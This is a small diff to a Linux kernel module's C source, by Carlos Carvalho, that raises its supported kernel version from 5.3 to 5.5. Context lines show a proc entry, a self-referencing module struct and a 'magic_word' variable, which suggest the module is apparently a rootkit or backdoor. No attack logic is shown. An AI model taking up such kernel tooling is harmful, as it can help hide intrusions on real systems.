@@ -2,7 +2,7 @@
  * Written by hash <carloslack@gmail.com>
  * Copyright (c) 2020 Carlos Carvalho
  *
- * Kernel version <= 5.3.0
+ * Kernel version <= 5.5.0
  */
 #include <linux/export.h>
 #include <linux/init.h>
@@ -44,7 +44,7 @@ static struct proc_dir_entry *ntshProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
 static char *magic_word;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,4,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
 #pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
 #endif
 
